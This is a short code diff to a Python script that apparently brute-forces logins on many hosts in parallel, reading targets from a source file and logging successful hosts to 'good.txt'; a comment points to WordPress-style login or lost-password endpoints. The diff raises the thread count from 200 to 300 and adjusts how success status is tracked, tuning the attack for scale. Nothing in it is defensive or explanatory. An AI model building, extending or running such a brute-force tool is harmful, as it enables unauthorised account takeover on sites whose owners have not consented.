@@ -16,7 +16,7 @@ headers = {
 
 source_file = "source.txt"
 #theard_count = int(input('Number of threads: '))
-theard_count = 200 
+theard_count = 300 
 def brut(string):
     t = string.split()
     payload = {
@@ -49,6 +49,7 @@ def brut(string):
         #return False
 #action=lostpassword
 def run(queue, result_queue):
+    status = False
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
         # получаем первую задачу из очереди
@@ -64,7 +65,7 @@ def run(queue, result_queue):
         result_queue.put_nowait((status, host))
         # сообщаем о выполнении полученной задачи
         queue.task_done()
-        if status:
+        if status == True:
             print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
             open('good.txt', 'a+').write(host + '\n')
         else:
